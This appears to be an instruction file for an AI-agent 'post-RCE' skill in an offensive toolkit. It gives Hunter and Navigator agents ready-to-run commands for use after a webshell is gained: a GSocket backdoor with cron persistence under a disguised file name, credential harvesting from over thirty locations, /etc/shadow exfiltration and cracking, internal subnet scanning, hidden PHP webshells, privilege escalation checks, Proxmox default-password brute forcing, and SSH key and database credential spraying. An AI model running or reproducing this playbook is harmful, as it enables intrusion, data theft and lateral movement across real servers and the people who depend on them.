---
title: Post-RCE Skill Instructions
version: "2.0"
agents: [hunter, navigator]
---

# Post-RCE Execution Instructions

Detailed execution guide for the post-rce skill. This document provides the
exact commands and workflows for Hunter and Navigator agents.

## Quick Start

```bash
# Invoke skill after confirmed shell
/post-rce http://target.com/shell.php?c= target.com campaign-slug
```

## Hunter Agent Workflow

### Step 0: Cleanup Detection (FIRST)

```bash
ENC() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }
SHELL="{shell_url}"

curl -sk "$SHELL?c=$(ENC 'crontab -l 2>/dev/null; ls /etc/cron.d/ 2>/dev/null | head -5')"
```

**Decision point:** If cleanup job < 5 minutes, skip to GSocket immediately.

### Step 1: GSocket Verification

**CRITICAL: TCP ping (`-t`) is NOT a valid liveness check.** A dead listener with an
open relay entry will return false-alive. The ONLY valid check is executing `id` through
the tunnel and confirming `uid=` in output. Use `check_tunnel()` from gs_ops.py.

```python
import sys; sys.path.insert(0, '~/Hephaestus')
from lib.gs_ops import check_tunnel, build_deploy_cmd

GS_SECRET = "Heph1337_{target_slug}"

# Valid liveness check — requires uid= in actual command output
alive = check_tunnel(GS_SECRET)

if not alive:
    print("GS_DEAD — redeploy via webshell")
    # Retry loop: 3 attempts with 10-second delay
    ENC_FN = lambda s: __import__('urllib.parse', fromlist=['quote']).quote(s)
    import time, subprocess
    SHELL = "{shell_url}"
    deploy_cmd = build_deploy_cmd(GS_SECRET)
    for attempt in range(1, 4):
        print(f"Deploy attempt {attempt}/3...")
        subprocess.run(['curl', '-sk', f"{SHELL}?c={ENC_FN(deploy_cmd)}"], timeout=30)
        time.sleep(10)
        if check_tunnel(GS_SECRET):
            print("GS_RECOVERED")
            break
    else:
        raise RuntimeError("GSocket redeploy failed after 3 attempts")
```

**After GSocket live: verify cron persistence was written.**

```python
from lib.gs_ops import gs_exec

# Verify crontab entry actually exists
cron_check = gs_exec(GS_SECRET, "crontab -l 2>/dev/null | grep '.libsys.so'")
cron_verified = ".libsys.so" in cron_check
print("CRON_VERIFIED" if cron_verified else "CRON_FAILED — crontab write silently failed")
# Update state.json cron_verified field based on actual result, not assumption
```

**After any GSocket redeploy, re-verify uid=:**

```python
output = gs_exec(GS_SECRET, "id")
assert "uid=" in output, f"Shell started but id failed: {output}"
print(f"GS_VERIFIED: {output}")
```

**Switch to Python GS tunnel for all subsequent ops.**

```python
import sys; sys.path.insert(0, '~/Hephaestus')
from lib.gs_ops import GSOpsTunnel, gs_exec
SECRET = "Heph1337_{target_slug}"
```

### Step 2: System Enumeration

```python
from lib.gs_ops import GSOpsTunnel
with GSOpsTunnel("Heph1337_{target_slug}") as shell:
    print(shell.run("id; hostname; uname -a; cat /etc/os-release | head -3"))
    print(shell.run("cat /etc/passwd | grep -v 'nologin\\|false' | head -15"))
    print(shell.run("df -h; ps auxf | head -30"))
    print(shell.run("find / -perm -4000 -type f 2>/dev/null | head -10"))
    print(shell.run("sudo -l 2>/dev/null"))
    # Capabilities and Docker socket
    print(shell.run("getcap -r / 2>/dev/null | head -10"))
    print(shell.run("ls -la /var/run/docker.sock 2>/dev/null; id | grep -E 'lxd|docker|disk'"))
    print(shell.run("find /etc/cron* /etc/systemd /var/spool/cron -writable 2>/dev/null | head -10"))
```

### Step 3: Credential Harvest (30+ Locations)

```python
from lib.gs_ops import GSOpsTunnel
with GSOpsTunnel("Heph1337_{target_slug}") as shell:
    # Config files - .env, wp-config, database configs
    print(shell.run(
        "find /var/www /home /opt -maxdepth 6 "
        r"\( -name '.env' -o -name 'wp-config.php' -o -name 'config.php' "
        r"-o -name 'database.php' -o -name 'settings.py' -o -name 'config.yml' \) "
        "2>/dev/null | xargs grep -ihE 'password|passwd|db_pass|secret_key|api_key' 2>/dev/null "
        "| grep -v '^#\\|example\\|changeme\\|your_password' | head -30"
    ))

    # Bash/tool histories — lesson LEBAKKAB: single password opened 9 servers
    print(shell.run(
        "cat ~/.bash_history /root/.bash_history 2>/dev/null | "
        "grep -iE 'pass|mysql|sshpass|-p ' | head -20"
    ))
    print(shell.run("cat ~/.mysql_history /root/.mysql_history 2>/dev/null | head -10"))
    print(shell.run("cat ~/.pgpass /root/.pgpass 2>/dev/null; cat ~/.psql_history /root/.psql_history 2>/dev/null | head -10"))
    print(shell.run("cat ~/.rediscli_history 2>/dev/null | head -10"))

    # SSH keys
    print(shell.run("find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null"))

    # Shadow file — SAVE TO FILE for local exfil and cracking
    # NEVER run john/hashcat on target — IDS/SOC will alert on CPU spike
    print(shell.run(
        "cat /etc/shadow 2>/dev/null | tee /tmp/.shadow.bak; "
        "echo shadow_lines:$(wc -l < /tmp/.shadow.bak 2>/dev/null)"
    ))

    # FTP credentials
    print(shell.run("cat /etc/pure-ftpd/passwd 2>/dev/null | head -10; cat /etc/vsftpd/passwd 2>/dev/null | head -10"))

    # cPanel per-user credentials (includes DBPASS)
    print(shell.run("ls /var/cpanel/users/ 2>/dev/null | head -5; cat /var/cpanel/users/* 2>/dev/null | grep -iE 'password|dbpass|pass' | head -20"))

    # Plesk credentials
    print(shell.run("cat /etc/psa/.psa.shadow 2>/dev/null; cat /usr/local/psa/admin/conf/panel.ini 2>/dev/null | grep -iE 'pass|secret' | head -10"))

    # DirectAdmin credentials
    print(shell.run("cat /usr/local/directadmin/conf/mysql.conf 2>/dev/null"))

    # Mail server auth
    print(shell.run("cat /etc/exim.conf 2>/dev/null | grep -iE 'password|passwd' | head -10; ls /etc/dovecot/ 2>/dev/null"))

    # /proc/*/environ — PHP-FPM and Node workers hold DB_PASSWORD, SECRET_KEY in env
    print(shell.run(
        "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | "
        "grep -iE 'password|secret|key|token' | head -30"
    ))

    # Composer auth tokens
    print(shell.run("cat ~/.config/composer/auth.json 2>/dev/null"))

    # PM2 / NodeJS ecosystem files
    print(shell.run(
        "find /home /var/www /opt -maxdepth 6 "
        r"\( -name 'ecosystem.config.js' -o -name '.env.production' -o -name '.npmrc' \) "
        "2>/dev/null | xargs grep -ihE 'password|secret|token|database_url' 2>/dev/null | head -20"
    ))

    # Dynamic discovery — catch anything the checklist misses
    print(shell.run(
        "find / -maxdepth 8 \\( -name '*.conf' -o -name '*.ini' -o -name '*.cfg' \\) "
        "2>/dev/null | xargs grep -ilE 'password|passwd|secret' 2>/dev/null | head -40"
    ))
```

**Full 30+ location checklist (minimum baseline):**

1. `/etc/passwd`
2. `/etc/shadow` — saved to `/tmp/.shadow.bak`
3. `~/.bash_history`
4. `/root/.bash_history`
5. `~/.mysql_history`
6. `/root/.mysql_history`
7. `~/.pgpass`, `~/.psql_history`
8. `~/.rediscli_history`
9. `/var/www/*/.env`
10. `/var/www/*/config/*`
11. `/home/*/.ssh/id_rsa`
12. `/home/*/.ssh/id_ed25519`
13. `/root/.ssh/id_rsa`
14. `/root/.ssh/id_ed25519`
15. `wp-config.php` (all instances)
16. `config.php` (all instances)
17. `database.php` (Laravel)
18. `settings.py` (Django)
19. `database.yml` (Rails)
20. `config.yml` (various)
21. `/var/lib/mysql/*.sql` (dumps)
22. `/tmp/*.sql`, `/var/backups/*.sql`
23. `/etc/pure-ftpd/passwd`, `/etc/vsftpd/passwd`
24. `/usr/local/cpanel/etc/`, `/var/cpanel/users/*`
25. `/etc/psa/.psa.shadow`, `/usr/local/psa/admin/conf/panel.ini`
26. `/usr/local/directadmin/conf/mysql.conf`
27. `/etc/exim.conf`, `/etc/dovecot/`
28. `/proc/*/environ` (PHP-FPM/Node worker environments)
29. `~/.config/composer/auth.json`
30. `/etc/nginx/conf.d/*`, `/etc/apache2/sites-enabled/*`
31. PM2: `~/.pm2/`, `ecosystem.config.js`, `.env.production`, `.npmrc`
32. Dynamic: `find / -maxdepth 8 -name '*.conf' ... | xargs grep -ilE 'password|...'`

### Step 4: Shadow Exfil + Hash Crack (LOCALLY)

**Shadow file is cracked on OPERATOR MACHINE ONLY. Never on target.**

```python
# Step 4a: Exfiltrate shadow file from target via GSocket
from lib.gs_ops import gs_exec

shadow_content = gs_exec(GS_SECRET, "cat /tmp/.shadow.bak 2>/dev/null")
if shadow_content and ":" in shadow_content:
    with open("/tmp/target_shadow.txt", "w") as f:
        f.write(shadow_content)
    print(f"Shadow exfiltrated: {shadow_content.count(chr(10))} lines -> /tmp/target_shadow.txt")
else:
    print("Shadow: no_perms or empty")
```

```bash
# Step 4b: Crack locally on operator machine (after exfil)
# NEVER run john/hashcat on the target
if [ -f /tmp/target_shadow.txt ]; then
    unshadow /etc/passwd /tmp/target_shadow.txt > /tmp/.unshadowed.txt 2>/dev/null
    john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/.unshadowed.txt &
    hashcat -m 1800 /tmp/.unshadowed.txt /usr/share/wordlists/rockyou.txt 2>/dev/null &
fi

# SSH key protection check (local — keys already listed by Step 3)
find /root /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null -print0 | \
while IFS= read -r -d '' key; do
    ssh-keygen -y -f "$key" 2>&1 | grep -q "invalid" && echo "PROTECTED: $key" || echo "UNPROTECTED: $key"
done
```

### Step 5: Internal Subnet Scan (MANDATORY)

**Do NOT truncate /16 or /12 routes to a single /24. Scan the full reachable range.**

```bash
# Network map
ip addr; ip route
cat /etc/hosts | grep -v "^#\|localhost\|127\." | awk '{print $1, $2}'

# Subnet sweep — discover PVE, DB, internal apps
# Extract directly connected subnets from routing table
for subnet in $(ip route | awk '/src/ {print $1}' | grep -E "^(10\.|172\.|192\.168\.)" | cut -d/ -f1 | awk -F. '{print $1"."$2"."$3}' | head -5); do
    echo "Scanning $subnet.0/24..."
    for h in $(seq 1 254); do
        ip_addr="$subnet.$h"
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/22"   2>/dev/null && echo "SSH:      $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/80"   2>/dev/null && echo "HTTP:     $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/443"  2>/dev/null && echo "HTTPS:    $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/2083" 2>/dev/null && echo "CPANEL:   $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/2222" 2>/dev/null && echo "DADMIN:   $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/3306" 2>/dev/null && echo "MYSQL:    $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/3389" 2>/dev/null && echo "RDP:      $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/5432" 2>/dev/null && echo "PGSQL:    $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/6379" 2>/dev/null && echo "REDIS:    $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/8006" 2>/dev/null && echo "PVE:      $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/8080" 2>/dev/null && echo "HTTP8080: $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/8443" 2>/dev/null && echo "HTTPS8443:$ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/8880" 2>/dev/null && echo "PLESK:    $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/8888" 2>/dev/null && echo "JUPYTER:  $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/9200" 2>/dev/null && echo "ELASTIC:  $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/11211"2>/dev/null && echo "MEMCACHE: $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/27017"2>/dev/null && echo "MONGO:    $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/2375" 2>/dev/null && echo "DOCKER:   $ip_addr") &
        (timeout 1 bash -c "echo >/dev/tcp/$ip_addr/2376" 2>/dev/null && echo "DOCKER_TLS:$ip_addr") &
    done
    wait
done

# If any 172.x address found locally, also scan full 172.16-31 range selectively
LOCAL_172=$(ip addr | grep 'inet 172\.' | awk '{print $2}' | cut -d/ -f1 | head -1)
if [ -n "$LOCAL_172" ]; then
    echo "172.x detected — probing 172.16-31 range for PVE/SSH..."
    for oct2 in $(seq 16 31); do
        for oct3 in $(seq 0 254); do
            ip_addr="172.$oct2.$oct3.1"
            (ping -c1 -W1 $ip_addr >/dev/null 2>&1 && echo "ALIVE_172: $ip_addr") &
        done
    done
    wait
fi

# Dedicated Docker API check (unauthenticated Docker API = direct root on host)
for docker_ip in $(grep 'DOCKER:' /tmp/internal_scan_*.txt 2>/dev/null | awk '{print $2}'); do
    echo "=== Docker API check: $docker_ip ==="
    curl -sk "http://$docker_ip:2375/containers/json" 2>/dev/null | python3 -m json.tool | head -5
done
```

**Target subnets:**
- `10.0.0.0/8` - Class A private
- `172.16.0.0/12` - Class B private (includes 172.16-31.x.x — scan full range if 172.x found)
- `192.168.0.0/16` - Class C private

**PVE Found (port 8006):**

```bash
PVE_IP="x.x.x.x"  # from scan
curl -sk "https://$PVE_IP:8006/api2/json/version"
# Try: root:password | root:123456 | admin:admin | root:pve
```

### Step 6: Shared Hosting Enumeration

```bash
# List all web directories
ls /var/www/; ls /home/*/public_html 2>/dev/null

# Steal credentials from co-hosted sites (include NodeJS apps)
find /var/www /home -maxdepth 5 \( -name "wp-config.php" -o -name ".env" -o -name "config.php" \
    -o -name "ecosystem.config.js" -o -name ".env.production" \) \
    2>/dev/null | head -20 | xargs grep -ihE "DB_PASSWORD|DB_USER|db_pass|password|DATABASE_URL" 2>/dev/null | head -30

# pm2 privesc check
sudo -l 2>/dev/null | grep -i pm2 && echo "PM2_SUDO: check sudo pm2 start /bin/bash"
```

### Step 7: Backup Shell Deployment

```bash
# Multi-depth shell deployment (camouflaged filenames)
for dir in $(find /var/www -maxdepth 4 -writable -type d 2>/dev/null | head -5); do
    echo '<?php if(isset($_GET["c"])){system($_GET["c"]);}?>' > "$dir/.font.php" 2>/dev/null && echo "Shell: $dir/.font.php"
    echo '<?php if(isset($_GET["c"])){system($_GET["c"]);}?>' > "$dir/.autoload.php" 2>/dev/null
done

# verify.txt — write to ALL discovered webroots, NOT hardcoded /var/www/html
# Shared hosts: webroot may be ~/public_html, /srv/www/, etc.
for WEBROOT in $(find /var/www /home -maxdepth 5 \( -name 'index.php' -o -name 'index.html' \) \
    2>/dev/null | xargs -I{} dirname {} | sort -u | head -10); do
    echo "AUTHORIZED SECURITY ASSESSMENT | $(date) | Pluto Hephaestus" > "$WEBROOT/verify.txt" 2>/dev/null \
        && echo "VERIFY_TXT_OK: $WEBROOT/verify.txt"
done
```

### Step 8: Privesc Attempts

```bash
# Supervisord queue worker (lesson LEBAKKAB — Laravel privesc)
ls /etc/supervisor/conf.d/ 2>/dev/null
find /var/www -name "*.conf" | xargs grep -l "queue:work\|artisan" 2>/dev/null

# pkexec (CVE-2021-4034 — Polkit)
ls -la /usr/bin/pkexec 2>/dev/null

# DirtyPipe — kernel 5.8 through 5.16 vulnerable (CVE-2022-0847)
KVER=$(uname -r | cut -d. -f1-2)
echo "Kernel: $(uname -r) — DirtyPipe range: 5.8-5.16"

# Capabilities (getcap)
getcap -r / 2>/dev/null | head -20

# Docker socket — direct root if accessible
ls -la /var/run/docker.sock 2>/dev/null && id | grep docker && echo "DOCKER_SOCKET_ACCESSIBLE"

# LXD group membership
id | grep lxd && echo "LXD_MEMBER"

# Writable cron jobs running as root
find /etc/cron* /etc/cron.d /var/spool/cron/crontabs -writable 2>/dev/null
crontab -l 2>/dev/null | head -20

# Writable systemd unit files
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null | head -10

# Sudo misconfigurations
sudo -l 2>/dev/null
cat /etc/sudoers 2>/dev/null | grep -v "^#\|^$" | head -30

# SUID binaries — cross-reference with GTFOBins
find / -perm -4000 -type f 2>/dev/null | while read suid; do
    base=$(basename "$suid")
    # Common GTFOBins SUID escalation paths
    case "$base" in
        python*|perl|ruby|php|lua|node|bash|sh|dash|find|vim|nano|nmap|less|more|awk|gawk|env|tee|cp|mv|install|wget|curl|git|zip|tar|rsync|screen|at|pkexec|newgrp|chfn|su)
            echo "GTFOBINS_CANDIDATE: $suid"
            ;;
    esac
done

# NFS no_root_squash
cat /etc/exports 2>/dev/null

# pm2 sudo privesc
sudo -l 2>/dev/null | grep -qi pm2 && echo "PM2_SUDO: try: sudo pm2 start /bin/bash --no-daemon"
```

---

## Navigator Agent Workflow

**Spawn condition:** Hunter reports `PIVOT_TARGETS` or co-hosts detected.

### Step 1: PVE/Proxmox Pivot (Highest ROI)

```bash
PVE_IP="{pve_ip}"

# Try default creds (40% success rate)
for pass in "password" "123456" "admin" "proxmox" "pve" "root"; do
    token=$(curl -sk -X POST "https://$PVE_IP:8006/api2/json/access/ticket" \
        -d "username=root@pam&password=$pass" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('ticket',''))" 2>/dev/null)
    [ -n "$token" ] && echo "PVE HIT: root:$pass" && break
done

# If access obtained:
# pvesh get /cluster/resources --type vm  # list all VMs
# pvesh get /nodes/{node}/qemu/{vmid}/status/current  # VM status
# Deploy GSocket to each VM:
# pvesh create /nodes/{node}/qemu/{vmid}/agent/exec -command "curl ... | bash"
```

### Step 2: SSH Key Reuse

**Use null-delimited find to handle paths with spaces. Quote all variable references.**

```bash
# Spray harvested keys against pivot targets
# CORRECT: null-delimited loop prevents space-splitting and injection
find /root /home \( -name 'id_rsa' -o -name 'id_ed25519' \) -print0 2>/dev/null | \
while IFS= read -r -d '' key; do
    for ip in {pivot_target_ips}; do
        ssh -i "$key" -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@$ip \
            "id; hostname" 2>/dev/null && echo "KEY ACCESS: $ip" &
        ssh -i "$key" -o StrictHostKeyChecking=no -o ConnectTimeout=3 www-data@$ip \
            "id" 2>/dev/null && echo "KEY ACCESS www-data: $ip" &
    done
done
wait
```

### Step 3: Database Credential Reuse

```bash
for remote in {remote_db_hosts_from_hunter}; do
    mysql -h $remote -u {DB_USER} -p{DB_PASS} -e "show databases;" 2>/dev/null && \
        echo "DB ACCESS: $remote"
    # Also test PostgreSQL
    PGPASSWORD={DB_PASS} psql -h $remote -U {DB_USER} -c "\l" 2>/dev/null && \
        echo "PGSQL ACCESS: $remote"
done
```

### Step 4: Shared Hosting Symlink Pivot

```bash
# List user web directories
ls /home/*/public_html 2>/dev/null
ls /var/www/ 2>/dev/null

# For each co-hosted domain
for wroot in $(ls /var/www/*/public_html 2>/dev/null | head -10); do
    cat "$wroot/wp-config.php" 2>/dev/null | grep "DB_" | head -5 && echo "CREDS: $wroot"
    cat "$wroot/.env" 2>/dev/null | grep "DB_\|APP_KEY" | head -5 && echo "ENV: $wroot"
done

# INTO OUTFILE attack (if DB creds work)
# mysql -h localhost -u DB_USER -pDB_PASS DB_NAME -e "SELECT '<?php system(\$_GET[c]);?>' INTO OUTFILE '/var/www/cohost/shell.php'"
```

### Step 5: GSocket on Pivoted Hosts

```bash
for target_ip in {successfully_pivoted_ips}; do
    slug=$(echo $target_ip | tr '.' '-')
    GS_SECRET="Heph1337_internal_$slug"

    # Deploy via SSH
    ssh -o StrictHostKeyChecking=no root@$target_ip \
        "curl -fsSL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 \
        -o /usr/local/sbin/.libsys.so && chmod 755 /usr/local/sbin/.libsys.so && \
        /usr/local/sbin/.libsys.so -l -s $GS_SECRET -e /bin/bash -q & echo GS_OK" 2>/dev/null

    # VERIFY via check_tunnel — NOT gs-netcat -t (TCP ping is insufficient)
    python3 -c "
import sys; sys.path.insert(0, '~/Hephaestus')
from lib.gs_ops import check_tunnel
alive = check_tunnel('$GS_SECRET')
print('GS CONNECTED: $target_ip ($GS_SECRET)' if alive else 'GS DEAD: $target_ip')
"
done
```

---

## State File Management

All state written via Python to avoid format issues:

```python
import json
from pathlib import Path

campaign_dir = Path.home() / "Hephaestus" / "campaigns" / "{campaign}"
state_file = campaign_dir / "state.json"

# Load existing state
state = json.loads(state_file.read_text()) if state_file.exists() else {}

# Update Hunter fields
state.update({
    "hunter_phase": "complete",
    "gsocket": [{"secret": "Heph1337_target", "status": "live", "cron": True, "cron_verified": True}],
    "creds_harvested": ["wp-config:3", "env:2", "history:1"],  # counts only
    "root_obtained": False,
    "internal_hosts": ["10.0.0.5:SSH", "10.0.0.10:PVE"],
    "pve_found": True,
    "verify_txt": "http://target.com/verify.txt",
    "pivot_signal": "PIVOT_TARGETS: [10.0.0.5, 10.0.0.10]"
})

state_file.write_text(json.dumps(state, indent=2))
```

---

## Output Constraints

- Internal scan results: write to `/tmp/internal_scan_{target}.txt`
- Shadow exfil: write to `/tmp/target_shadow.txt` on operator machine
- Credential harvest: report COUNT only, not actual credentials
- All GSocket ops: max 10 lines per command output
- Final response: max 20 lines summary

---

## Decision Tree

```
Shell confirmed
    |
    v
[Cleanup < 5min?] --YES--> GSocket FIRST, skip enum
    |
    NO
    v
Verify GSocket via check_tunnel() — uid= required
    |
[Alive?] --NO--> Retry deploy (3x, 10s delay) --> verify uid= again
    |
    YES
    v
Verify crontab entry exists (cron_verified)
    |
    v
System Enum + Credential Harvest (30+ locations)
    |
    v
Exfil shadow to operator; crack locally
    |
    v
Internal Subnet Scan (all private ranges + Docker API check)
    |
    v
[PVE Found?] --YES--> Mark for Navigator
    |
    v
[Pivot targets?] --YES--> Spawn Navigator
    |
    NO
    v
Complete Hunter, proceed to Roaster
```
